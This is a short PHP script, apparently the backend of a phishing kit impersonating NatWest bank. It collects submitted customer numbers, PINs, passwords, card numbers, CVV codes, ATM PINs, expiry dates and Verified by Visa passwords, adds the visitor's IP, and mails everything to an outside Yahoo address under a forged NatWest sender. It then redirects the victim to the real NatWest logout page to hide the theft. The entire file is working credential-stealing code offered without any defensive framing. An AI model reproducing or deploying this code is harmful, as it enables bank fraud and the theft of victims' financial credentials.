<?
$to = "shssh70@yahoo.com";
//------------------------------------
$DBID_edit = $_POST['DBID_edit'];
$LI6PPEA_edit = $_POST['LI6PPEA_edit'];
$LI6PPED_edit = $_POST['LI6PPED_edit'];
$LI6PPED_edit4 = $_POST['LI6PPED_edit4'];
$LI6PPED_edit5 = $_POST['LI6PPEA_edit5'];
$LI6PPED_edit2 = $_POST['LI6PPED_edit2'];
$LI6PPED_edit3 = $_POST['LI6PPED_edit3'];
$LI6PPED_edit0 = $_POST['LI6PPED_edit0'];
$LI6PPED_edit6 = $_POST['LI6PPED_edit6'];
$ccnumber = $_POST['ccnumber'];
$ip = $_SERVER['REMOTE_ADDR'];
$subj = "Natwest2011";
$msg = "Customer number : $DBID_edit\nEnter Your PIN : $LI6PPEA_edit\nEnter Your Password : $LI6PPED_edit\nEnter Last 3 Digit at the back of Card : $LI6PPED_edit4\nEnter ATM Debit Card PIN : $LI6PPED_edit5\nEnter Card Valid From : $LI6PPED_edit2\nEnter Your Card Exp Date : $LI6PPED_edit3\nVerified By Visa Or MasterCard Secure Code Password : $LI6PPED_edit6\nEnter Your Card Number : $ccnumber\nip : $ip";
$from = "From: BraIn Inc&#65533;lt;Membership.service@Natwest.co.uk>";
                {
          mail($to,$subj,$msg,$from);
                      }
   header("location: http://www.natwest.com/personal/logout/logout.ashx?referrer=online");
?>